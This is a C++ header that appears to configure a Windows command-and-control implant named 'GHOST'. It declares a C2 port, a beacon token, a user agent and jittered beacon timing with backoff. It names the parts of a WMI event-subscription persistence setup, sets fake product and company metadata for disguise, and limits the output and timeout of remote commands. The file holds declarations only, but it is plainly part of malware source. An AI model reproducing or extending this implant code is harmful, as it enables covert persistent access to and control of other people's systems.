#pragma once
#include <string>
#include <cstdint>

namespace config {

    extern const uint16_t C2_PORT;

    const wchar_t* GetBeaconToken();
    const wchar_t* GetUserAgent();

    // Beacon timing — values in SECONDS (override at build time:
    // -DGHOST_BEACON_MIN=n -DGHOST_BEACON_MAX=n, or build.sh prompts/env)
#ifndef GHOST_BEACON_MIN
#define GHOST_BEACON_MIN 18
#endif
#ifndef GHOST_BEACON_MAX
#define GHOST_BEACON_MAX 24
#endif
    constexpr uint32_t BEACON_MIN = GHOST_BEACON_MIN;
    constexpr uint32_t BEACON_MAX = GHOST_BEACON_MAX;
    constexpr uint32_t MAX_FAILURES = 5;
    constexpr uint32_t BACKOFF_FACTOR = 3;

    extern const wchar_t* WMI_CONSUMER_NAME;
    extern const wchar_t* WMI_FILTER_NAME;
    extern const wchar_t* WMI_BINDING_NAME;

    extern const wchar_t* PRODUCT_NAME;
    extern const wchar_t* FILE_DESCRIPTION;
    extern const wchar_t* COMPANY_NAME;

    constexpr DWORD CMD_OUTPUT_MAX = 65536;
    constexpr DWORD CMD_TIMEOUT_MS = 30000;
}